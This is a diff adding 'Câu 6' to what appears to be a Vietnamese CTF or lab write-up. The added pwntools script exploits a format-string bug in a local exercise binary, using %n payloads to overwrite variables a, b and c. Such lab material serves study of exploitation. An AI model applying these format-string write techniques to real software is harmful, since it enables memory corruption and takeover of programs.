@@ -143,3 +143,51 @@ for_c()
 ```
 
 ## Câu 6
+```python
+from pwn import *
+
+
+def for_c():
+    sh = process('./overwrite')
+    c_addr = int(sh.recvuntil('\n', drop=True), 16)
+    print(hex(c_addr))
+
+    payload = p32(c_addr) + b'%012d' + b'%6$n'
+    print(payload)
+
+    with open('payload.in', 'wb') as f:
+        f.write(payload)
+
+    sh.sendline(payload)
+    print(sh.recv())
+    sh.interactive()
+
+def for_a():
+    sh = process('./overwrite')
+    e = ELF('./overwrite')
+    a_addr = e.symbols['a']
+    payload = b'aa%8$naa' + p32(a_addr)
+    sh.sendline(payload)
+    print(sh.recv())
+    sh.interactive()
+
+def for_b():
+    sh = process('./overwrite')
+    e = ELF('./overwrite')
+    b_addr = e.symbols['b']
+    print(hex(b_addr))
+    
+    # payload = p32(b_addr) + b'%116x%6$n'
+    payload = p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3)
+    payload += b'%104x%6$n' + b'%222x%7$n' + b'%222x%8$n' + b'%222x%9$n'
+    print(payload)
+
+    with open('payload.in', 'wb') as f:
+        f.write(payload)
+
+    sh.sendline(payload)
+    print(sh.recv())
+    sh.interactive()
+
+for_b()
+```
